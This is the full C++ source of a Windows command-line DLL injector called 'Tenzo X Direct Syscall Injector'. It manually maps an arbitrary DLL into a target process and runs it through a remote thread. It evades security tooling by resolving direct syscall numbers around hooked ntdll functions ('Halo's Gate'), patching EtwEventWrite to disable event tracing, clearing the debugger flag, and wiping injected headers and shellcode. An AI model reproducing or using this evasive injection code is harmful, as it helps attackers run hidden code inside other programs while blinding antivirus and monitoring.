#include <windows.h>
#include <winternl.h>
#include <TlHelp32.h>
#include <cstdio>
#include <cstdint>
#include <string>
#include <vector>
#include <fstream>
#include <random>
#include <iostream>

#ifdef _MSC_VER
#pragma warning(push)
#pragma warning(disable: 4201)
#endif

namespace Config {
    constexpr bool WIPE_HEADERS = true;
    constexpr bool RANDOMIZE_BASE = true;
    constexpr bool ENABLE_SEH = true;
    constexpr int MAX_RANDOM_ATTEMPTS = 3;
    constexpr size_t SHELLCODE_SIZE = 0x1000;
}

typedef struct _OBJECT_ATTRIBUTES_SC {
    ULONG Length;
    HANDLE RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;
    PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES_SC;

typedef struct _CLIENT_ID_SC {
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID_SC;

typedef struct _PS_ATTRIBUTE {
    ULONGLONG Attribute;
    SIZE_T Size;
    union {
        ULONG_PTR Value;
        PVOID ValuePtr;
    };
    PSIZE_T ReturnLength;
} PS_ATTRIBUTE;

typedef struct _PS_ATTRIBUTE_LIST {
    SIZE_T TotalLength;
    PS_ATTRIBUTE Attributes[2];
} PS_ATTRIBUTE_LIST;

extern "C" {
    DWORD wNtAllocateVirtualMemory = 0;
    DWORD wNtWriteVirtualMemory = 0;
    DWORD wNtReadVirtualMemory = 0;
    DWORD wNtProtectVirtualMemory = 0;
    DWORD wNtFreeVirtualMemory = 0;
    DWORD wNtQueryVirtualMemory = 0;
    DWORD wNtCreateThreadEx = 0;
    DWORD wNtWaitForSingleObject = 0;
    DWORD wNtOpenProcess = 0;
    DWORD wNtClose = 0;
}

extern "C" {
    NTSTATUS NTAPI NtAllocateVirtualMemory(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
    NTSTATUS NTAPI NtWriteVirtualMemory(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
    NTSTATUS NTAPI NtReadVirtualMemory(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
    NTSTATUS NTAPI NtProtectVirtualMemory(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
    NTSTATUS NTAPI NtFreeVirtualMemory(HANDLE, PVOID*, PSIZE_T, ULONG);
    NTSTATUS NTAPI NtQueryVirtualMemory(HANDLE, PVOID, ULONG, PVOID, SIZE_T, PSIZE_T);
    NTSTATUS NTAPI NtCreateThreadEx(PHANDLE, ACCESS_MASK, OBJECT_ATTRIBUTES_SC*, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PS_ATTRIBUTE_LIST*);
    NTSTATUS NTAPI NtWaitForSingleObject(HANDLE, BOOLEAN, PLARGE_INTEGER);
    NTSTATUS NTAPI NtOpenProcess(PHANDLE, ACCESS_MASK, OBJECT_ATTRIBUTES_SC*, CLIENT_ID_SC*);
    NTSTATUS NTAPI NtClose(HANDLE);
}

using pLoadLibraryA = HINSTANCE(WINAPI*)(const char*);
using pGetProcAddress = FARPROC(WINAPI*)(HMODULE, LPCSTR);
#ifdef _WIN64
using pRtlAddFunctionTable = BOOL(WINAPIV*)(PRUNTIME_FUNCTION, DWORD, DWORD64);
#endif

struct SHELLCODE_CONTEXT {
    pLoadLibraryA fnLoadLib;
    pGetProcAddress fnGetProc;
#ifdef _WIN64
    pRtlAddFunctionTable fnAddTable;
#endif
    BYTE* baseAddr;
    HINSTANCE modHandle;
    DWORD reason;
    LPVOID reserved;
    bool sehEnabled;
};

#define INVALID_DATA_POINTER ((HINSTANCE)0x404040)
#define SEH_SUPPORT_FAILED ((HINSTANCE)0x505050)
#define RELOC_FLAG(RelInfo) (((RelInfo) >> 12) == IMAGE_REL_BASED_DIR64)

static bool g_verbose = true;

static void Log(const char* tag, const char* fmt, ...) {
    if (!g_verbose) return;
    printf("[%s] ", tag);
    va_list args;
    va_start(args, fmt);
    vprintf(fmt, args);
    va_end(args);
    printf("\n");
}

static bool IsFunctionHooked(BYTE* p) {
    return !(p[0] == 0x4C && p[1] == 0x8B && p[2] == 0xD1);
}

static DWORD GetSSNFromNeighbor(BYTE* pFunc, int maxDist = 32) {
    for (int i = 1; i <= maxDist; i++) {
        BYTE* n = pFunc - (i * 32);
        if (n[0] == 0x4C && n[1] == 0x8B && n[2] == 0xD1 && n[3] == 0xB8)
            return *(DWORD*)(n + 4) + i;
    }
    for (int i = 1; i <= maxDist; i++) {
        BYTE* n = pFunc + (i * 32);
        if (n[0] == 0x4C && n[1] == 0x8B && n[2] == 0xD1 && n[3] == 0xB8)
            return *(DWORD*)(n + 4) - i;
    }
    return 0;
}

static DWORD GetSSN(HMODULE hNtdll, const char* name) {
    BYTE* p = (BYTE*)GetProcAddress(hNtdll, name);
    if (!p) return 0;
    if (IsFunctionHooked(p)) {
        Log("SSN", "%s hooked, using Halo's Gate", name);
        return GetSSNFromNeighbor(p);
    }
    if (p[3] != 0xB8) return 0;
    return *(DWORD*)(p + 4);
}

static bool InitSyscalls() {
    HMODULE h = GetModuleHandleW(L"ntdll.dll");
    if (!h) return false;

    wNtAllocateVirtualMemory = GetSSN(h, "NtAllocateVirtualMemory");
    wNtWriteVirtualMemory    = GetSSN(h, "NtWriteVirtualMemory");
    wNtReadVirtualMemory     = GetSSN(h, "NtReadVirtualMemory");
    wNtProtectVirtualMemory  = GetSSN(h, "NtProtectVirtualMemory");
    wNtFreeVirtualMemory     = GetSSN(h, "NtFreeVirtualMemory");
    wNtQueryVirtualMemory    = GetSSN(h, "NtQueryVirtualMemory");
    wNtCreateThreadEx        = GetSSN(h, "NtCreateThreadEx");
    wNtWaitForSingleObject   = GetSSN(h, "NtWaitForSingleObject");
    wNtOpenProcess           = GetSSN(h, "NtOpenProcess");
    wNtClose                 = GetSSN(h, "NtClose");

    bool ok = wNtAllocateVirtualMemory && wNtWriteVirtualMemory &&
              wNtCreateThreadEx && wNtWaitForSingleObject;
    if (ok) {
        Log("SSN", "NtAllocateVirtualMemory: 0x%X", wNtAllocateVirtualMemory);
        Log("SSN", "NtWriteVirtualMemory:    0x%X", wNtWriteVirtualMemory);
        Log("SSN", "NtCreateThreadEx:        0x%X", wNtCreateThreadEx);
        Log("SSN", "NtWaitForSingleObject:   0x%X", wNtWaitForSingleObject);
    }
    return ok;
}

static BYTE* RandomBase(DWORD imageSize) {
    static std::mt19937_64 gen(std::random_device{}() ^ GetTickCount64());
    std::uniform_int_distribution<ULONG_PTR> dist(0x10000000ULL, 0x7FF00000000ULL);
    ULONG_PTR a = dist(gen) & ~0xFFFFULL;
    if (a > (0x7FFFFFFF0000ULL - imageSize)) a = 0x10000000ULL;
    return (BYTE*)a;
}

#pragma runtime_checks("", off)
#pragma optimize("", off)
static void __stdcall Shellcode(SHELLCODE_CONTEXT* ctx) {
    if (!ctx) {
        ctx->modHandle = INVALID_DATA_POINTER;
        return;
    }

    BYTE* base = ctx->baseAddr;
    auto* opt = &((IMAGE_NT_HEADERS*)(base + ((IMAGE_DOS_HEADER*)base)->e_lfanew))->OptionalHeader;
    auto _LL = ctx->fnLoadLib;
    auto _GP = ctx->fnGetProc;
    auto _DM = (BOOL(WINAPI*)(void*, DWORD, void*))(base + opt->AddressOfEntryPoint);

    BYTE* delta = base - opt->ImageBase;
    if (delta && opt->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size) {
        auto* rel = (IMAGE_BASE_RELOCATION*)(base + opt->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
        auto* end = (BYTE*)rel + opt->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
        while ((BYTE*)rel < end && rel->SizeOfBlock) {
            UINT cnt = (rel->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
            WORD* info = (WORD*)(rel + 1);
            for (UINT i = 0; i < cnt; i++) {
                if (RELOC_FLAG(info[i]))
                    *(UINT_PTR*)(base + rel->VirtualAddress + (info[i] & 0xFFF)) += (UINT_PTR)delta;
            }
            rel = (IMAGE_BASE_RELOCATION*)((BYTE*)rel + rel->SizeOfBlock);
        }
    }

    if (opt->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size) {
        auto* imp = (IMAGE_IMPORT_DESCRIPTOR*)(base + opt->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
        while (imp->Name) {
            HMODULE m = _LL((char*)(base + imp->Name));
            if (!m) {
                ctx->modHandle = INVALID_DATA_POINTER;
                return;
            }
            ULONG_PTR* th = (ULONG_PTR*)(base + imp->OriginalFirstThunk);
            ULONG_PTR* fn = (ULONG_PTR*)(base + imp->FirstThunk);
            if (!th) th = fn;
            for (; *th; ++th, ++fn) {
                if (IMAGE_SNAP_BY_ORDINAL(*th))
                    *fn = (ULONG_PTR)_GP(m, (char*)(*th & 0xFFFF));
                else
                    *fn = (ULONG_PTR)_GP(m, ((IMAGE_IMPORT_BY_NAME*)(base + *th))->Name);
            }
            ++imp;
        }
    }

    if (opt->DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].Size) {
        auto* tls = (IMAGE_TLS_DIRECTORY*)(base + opt->DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress);
        auto** cb = (PIMAGE_TLS_CALLBACK*)(tls->AddressOfCallBacks);
        for (; cb && *cb; ++cb)
            (*cb)(base, DLL_PROCESS_ATTACH, nullptr);
    }

    bool sehFail = false;
#ifdef _WIN64
    if (ctx->sehEnabled) {
        auto& ex = opt->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];
        if (ex.Size && ctx->fnAddTable) {
            if (!ctx->fnAddTable((IMAGE_RUNTIME_FUNCTION_ENTRY*)(base + ex.VirtualAddress),
                ex.Size / sizeof(IMAGE_RUNTIME_FUNCTION_ENTRY), (DWORD64)base))
                sehFail = true;
        }
    }
#endif

    _DM(base, ctx->reason, ctx->reserved);
    ctx->modHandle = sehFail ? SEH_SUPPORT_FAILED : (HINSTANCE)base;
}
#pragma runtime_checks("", restore)
#pragma optimize("", on)

enum class Status {
    Success, InvalidPE, AllocFail, WriteHdrFail, WriteSectFail,
    CtxAllocFail, ShellAllocFail, ThreadFail, ShellExecFail, SyscallFail
};

const char* StatusStr(Status s) {
    switch (s) {
        case Status::Success:       return "Success";
        case Status::InvalidPE:     return "Invalid PE";
        case Status::AllocFail:     return "Allocation failed";
        case Status::WriteHdrFail:  return "Header write failed";
        case Status::WriteSectFail: return "Section write failed";
        case Status::CtxAllocFail:  return "Context allocation failed";
        case Status::ShellAllocFail:return "Shellcode allocation failed";
        case Status::ThreadFail:    return "Thread creation failed";
        case Status::ShellExecFail: return "Shellcode execution failed";
        case Status::SyscallFail:   return "Syscall init failed";
        default: return "Unknown";
    }
}

static void* g_lastBase = nullptr;

static Status Inject(HANDLE hProc, const BYTE* dll, size_t dllSz) {
    if (!InitSyscalls()) return Status::SyscallFail;
    if (dllSz < sizeof(IMAGE_DOS_HEADER)) return Status::InvalidPE;

    auto* dos = (const IMAGE_DOS_HEADER*)dll;
    if (dos->e_magic != 0x5A4D) return Status::InvalidPE;

    auto* nt = (const IMAGE_NT_HEADERS*)(dll + dos->e_lfanew);
    if (nt->Signature != 0x4550) return Status::InvalidPE;

    auto* opt = &nt->OptionalHeader;
    auto* fh = &nt->FileHeader;
    DWORD imgSz = opt->SizeOfImage;

    Log("INJ", "Image: 0x%X bytes, %u sections", imgSz, fh->NumberOfSections);

    BYTE* tgt = nullptr;
    SIZE_T rsz = imgSz;
    NTSTATUS st = 0xC0000001;

    if (Config::RANDOMIZE_BASE) {
        for (int i = 0; i < Config::MAX_RANDOM_ATTEMPTS && !tgt; i++) {
            PVOID b = RandomBase(imgSz);
            rsz = imgSz;
            st = NtAllocateVirtualMemory(hProc, &b, 0, &rsz, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (NT_SUCCESS(st)) tgt = (BYTE*)b;
        }
    }
    if (!tgt) {
        PVOID b = nullptr;
        rsz = imgSz;
        st = NtAllocateVirtualMemory(hProc, &b, 0, &rsz, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (NT_SUCCESS(st)) tgt = (BYTE*)b;
    }
    if (!tgt) return Status::AllocFail;
    Log("INJ", "Base: 0x%p", tgt);

    st = NtWriteVirtualMemory(hProc, tgt, (PVOID)dll, opt->SizeOfHeaders, nullptr);
    if (!NT_SUCCESS(st)) {
        SIZE_T fs = 0;
        PVOID fb = tgt;
        NtFreeVirtualMemory(hProc, &fb, &fs, MEM_RELEASE);
        return Status::WriteHdrFail;
    }

    auto sec = IMAGE_FIRST_SECTION(nt);
    for (UINT i = 0; i < fh->NumberOfSections; i++, sec++) {
        if (sec->SizeOfRawData > 0) {
            st = NtWriteVirtualMemory(hProc, tgt + sec->VirtualAddress,
                (PVOID)(dll + sec->PointerToRawData), sec->SizeOfRawData, nullptr);
            if (!NT_SUCCESS(st)) {
                SIZE_T fs = 0;
                PVOID fb = tgt;
                NtFreeVirtualMemory(hProc, &fb, &fs, MEM_RELEASE);
                return Status::WriteSectFail;
            }
        }
    }

    SHELLCODE_CONTEXT ctx = {};
    ctx.fnLoadLib = LoadLibraryA;
    ctx.fnGetProc = GetProcAddress;
#ifdef _WIN64
    ctx.fnAddTable = (pRtlAddFunctionTable)RtlAddFunctionTable;
#endif
    ctx.baseAddr = tgt;
    ctx.reason = DLL_PROCESS_ATTACH;
    ctx.sehEnabled = Config::ENABLE_SEH;

    PVOID ctxMem = nullptr;
    SIZE_T ctxSz = sizeof(ctx);
    st = NtAllocateVirtualMemory(hProc, &ctxMem, 0, &ctxSz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!NT_SUCCESS(st)) {
        SIZE_T fs = 0;
        PVOID fb = tgt;
        NtFreeVirtualMemory(hProc, &fb, &fs, MEM_RELEASE);
        return Status::CtxAllocFail;
    }
    NtWriteVirtualMemory(hProc, ctxMem, &ctx, sizeof(ctx), nullptr);

    PVOID scode = nullptr;
    SIZE_T scSz = Config::SHELLCODE_SIZE;
    st = NtAllocateVirtualMemory(hProc, &scode, 0, &scSz, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!NT_SUCCESS(st)) {
        SIZE_T fs = 0;
        PVOID fb = tgt;
        NtFreeVirtualMemory(hProc, &fb, &fs, MEM_RELEASE);
        fb = ctxMem;
        NtFreeVirtualMemory(hProc, &fb, &fs, MEM_RELEASE);
        return Status::ShellAllocFail;
    }
    NtWriteVirtualMemory(hProc, scode, (void*)Shellcode, Config::SHELLCODE_SIZE, nullptr);

    HANDLE hThread = nullptr;
    OBJECT_ATTRIBUTES_SC oa = { sizeof(OBJECT_ATTRIBUTES_SC), 0 };
    st = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, &oa, hProc, scode, ctxMem, 0, 0, 0, 0, nullptr);
    if (!NT_SUCCESS(st) || !hThread) {
        SIZE_T fs = 0;
        PVOID fb = tgt;
        NtFreeVirtualMemory(hProc, &fb, &fs, MEM_RELEASE);
        fb = ctxMem;
        NtFreeVirtualMemory(hProc, &fb, &fs, MEM_RELEASE);
        fb = scode;
        NtFreeVirtualMemory(hProc, &fb, &fs, MEM_RELEASE);
        return Status::ThreadFail;
    }

    NtWaitForSingleObject(hThread, FALSE, nullptr);
    NtClose(hThread);

    SHELLCODE_CONTEXT res = {};
    NtReadVirtualMemory(hProc, ctxMem, &res, sizeof(res), nullptr);

    if (res.modHandle == INVALID_DATA_POINTER) {
        SIZE_T fs = 0;
        PVOID fb = tgt;
        NtFreeVirtualMemory(hProc, &fb, &fs, MEM_RELEASE);
        fb = ctxMem;
        NtFreeVirtualMemory(hProc, &fb, &fs, MEM_RELEASE);
        fb = scode;
        NtFreeVirtualMemory(hProc, &fb, &fs, MEM_RELEASE);
        return Status::ShellExecFail;
    }

    g_lastBase = res.modHandle;

    BYTE zeros[0x1000] = {};
    NtWriteVirtualMemory(hProc, scode, zeros, sizeof(zeros), nullptr);
    SIZE_T fs = 0;
    PVOID fb = scode;
    NtFreeVirtualMemory(hProc, &fb, &fs, MEM_RELEASE);
    fb = ctxMem;
    NtFreeVirtualMemory(hProc, &fb, &fs, MEM_RELEASE);

    if (Config::WIPE_HEADERS) {
        SIZE_T hs = min((SIZE_T)0x1000, (SIZE_T)opt->SizeOfHeaders);
        BYTE hz[0x1000] = {};
        NtWriteVirtualMemory(hProc, tgt, hz, hs, nullptr);
        Log("INJ", "Headers wiped");
    }

    Log("INJ", "Injected at 0x%p", g_lastBase);
    return Status::Success;
}

static DWORD FindPID(const wchar_t* name) {
    DWORD pid = 0;
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32W pe = { sizeof(pe) };
    if (Process32FirstW(snap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, name) == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    return pid;
}

static std::wstring ToWide(const std::string& s) {
    if (s.empty()) return {};
    int sz = MultiByteToWideChar(CP_UTF8, 0, s.c_str(), (int)s.size(), nullptr, 0);
    std::wstring r(sz, 0);
    MultiByteToWideChar(CP_UTF8, 0, s.c_str(), (int)s.size(), &r[0], sz);
    return r;
}

static std::string ToNarrow(const std::wstring& ws) {
    if (ws.empty()) return {};
    int sz = WideCharToMultiByte(CP_UTF8, 0, ws.c_str(), (int)ws.size(), nullptr, 0, nullptr, nullptr);
    std::string r(sz, 0);
    WideCharToMultiByte(CP_UTF8, 0, ws.c_str(), (int)ws.size(), &r[0], sz, nullptr, nullptr);
    return r;
}

static void PatchETW() {
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll) return;
    void* pEtw = (void*)GetProcAddress(hNtdll, "EtwEventWrite");
    if (!pEtw) return;
    DWORD oldProt = 0;
    if (VirtualProtect(pEtw, 1, PAGE_EXECUTE_READWRITE, &oldProt)) {
        *(BYTE*)pEtw = 0xC3;
        VirtualProtect(pEtw, 1, oldProt, &oldProt);
        Log("UD", "ETW patched");
    }
}

static void ClearDebugFlag() {
#ifdef _WIN64
    PPEB peb = (PPEB)__readgsqword(0x60);
#else
    PPEB peb = (PPEB)__readfsdword(0x30);
#endif
    if (peb) {
        peb->BeingDebugged = 0;
        Log("UD", "Debug flag cleared");
    }
}

static HANDLE OpenProcessSyscall(DWORD pid) {
    if (!InitSyscalls()) return nullptr;
    HANDLE hProc = nullptr;
    OBJECT_ATTRIBUTES_SC oa = { sizeof(OBJECT_ATTRIBUTES_SC), 0 };
    CLIENT_ID_SC cid = {};
    cid.UniqueProcess = (HANDLE)(ULONG_PTR)pid;
    NTSTATUS st = NtOpenProcess(&hProc, PROCESS_ALL_ACCESS, &oa, &cid);
    if (!NT_SUCCESS(st)) return nullptr;
    return hProc;
}

struct ProcInfo {
    DWORD pid;
    std::wstring name;
};

static std::vector<ProcInfo> ListProcesses() {
    std::vector<ProcInfo> list;
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return list;

    PROCESSENTRY32W pe = { sizeof(pe) };
    if (Process32FirstW(snap, &pe)) {
        do {
            if (pe.th32ProcessID > 4)
                list.push_back({ pe.th32ProcessID, pe.szExeFile });
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    return list;
}

static void SetColor(WORD color) {
    SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), color);
}

static void Banner() {
    SetColor(0x0D);
    printf("\n");
    printf("  ______                 _  __   ____  _____ _____ \n");
    printf(" /_  __/__  ____  ____  | |/ /  / __ \\/ ___//  _/ \n");
    printf("  / / / _ \\/ __ \\/_  / /   /  / / / /\\__ \\ / /   \n");
    printf(" / / /  __/ / / / / /_/   |  / /_/ /___/ _/ /    \n");
    printf("/_/  \\___/_/ /_/ /___/_/|_| /_____//____/___/    \n");
    SetColor(0x07);
    printf("\n");
    SetColor(0x0F);
    printf("  Tenzo X Direct Syscall Injector v1.0\n");
    SetColor(0x08);
    printf("  Manual Map | Halo's Gate | RWX Bypass | ETW Patch\n");
    printf("  ================================================\n\n");
    SetColor(0x07);
}

static void PrintMenu() {
    SetColor(0x0F);
    printf("  [1] ");
    SetColor(0x07);
    printf("Inject DLL\n");
    SetColor(0x0F);
    printf("  [2] ");
    SetColor(0x07);
    printf("List processes\n");
    SetColor(0x0F);
    printf("  [3] ");
    SetColor(0x07);
    printf("Exit\n\n");
    SetColor(0x0E);
    printf("  > ");
    SetColor(0x07);
}

static void ShowProcessList() {
    auto procs = ListProcesses();
    SetColor(0x0E);
    printf("\n  %-8s %s\n", "PID", "Process");
    SetColor(0x08);
    printf("  %-8s %s\n", "--------", "--------------------");
    SetColor(0x07);
    for (auto& p : procs)
        printf("  %-8u %s\n", p.pid, ToNarrow(p.name).c_str());
    printf("\n  Total: %zu processes\n\n", procs.size());
}

static int DoInject(DWORD pid, const std::string& dllPath) {
    PatchETW();
    ClearDebugFlag();

    HANDLE hProc = OpenProcessSyscall(pid);
    if (!hProc)
        hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

    if (!hProc) {
        printf("[!] Failed to open PID %u (error %u)\n", pid, GetLastError());
        return 1;
    }

    printf("[*] Target PID: %u\n", pid);
    printf("[*] DLL: %s\n\n", dllPath.c_str());

    std::ifstream f(dllPath, std::ios::binary | std::ios::ate);
    if (!f.is_open()) {
        printf("[!] Cannot open DLL file\n");
        NtClose(hProc);
        return 1;
    }

    auto sz = f.tellg();
    f.seekg(0);
    std::vector<BYTE> buf(sz);
    f.read((char*)buf.data(), sz);
    f.close();

    Status res = Inject(hProc, buf.data(), buf.size());
    NtClose(hProc);

    if (res == Status::Success) {
        printf("[+] Injected at 0x%p\n", g_lastBase);
        return 0;
    }

    printf("[-] Failed: %s\n", StatusStr(res));
    return 1;
}

static int InteractiveMode() {
    while (true) {
        PrintMenu();
        char choice[8] = {};
        if (!fgets(choice, sizeof(choice), stdin)) break;
        if (choice[0] == '3' || choice[0] == 'q') break;

        if (choice[0] == '2') {
            ShowProcessList();
            continue;
        }

        if (choice[0] == '1') {
            char pidBuf[64] = {}, dllBuf[512] = {};

            printf("  Process (PID or name): ");
            if (!fgets(pidBuf, sizeof(pidBuf), stdin)) break;
            pidBuf[strcspn(pidBuf, "\r\n")] = 0;

            printf("  DLL path: ");
            if (!fgets(dllBuf, sizeof(dllBuf), stdin)) break;
            dllBuf[strcspn(dllBuf, "\r\n")] = 0;

            printf("\n");
            DWORD pid = 0;
            try {
                pid = std::stoul(pidBuf);
            } catch (...) {
                pid = FindPID(ToWide(pidBuf).c_str());
                if (!pid) {
                    printf("[!] Process not found: %s\n\n", pidBuf);
                    continue;
                }
                printf("[*] Found \"%s\" -> PID %u\n", pidBuf, pid);
            }
            DoInject(pid, dllBuf);
            printf("\n");
        }
    }
    return 0;
}

int main(int argc, char* argv[]) {
    SetConsoleTitleW(L"TenzoX DSI");
    Banner();

    if (argc >= 3) {
        std::string targetArg = argv[1];
        std::string dllPath = argv[2];
        DWORD pid = 0;
        try {
            pid = std::stoul(targetArg);
        } catch (...) {
            pid = FindPID(ToWide(targetArg).c_str());
            if (!pid) {
                printf("[!] Process not found: %s\n", targetArg.c_str());
                return 1;
            }
            printf("[*] Found \"%s\" -> PID %u\n", targetArg.c_str(), pid);
        }
        return DoInject(pid, dllPath);
    }

    return InteractiveMode();
}

#ifdef _MSC_VER
#pragma warning(pop)
#endif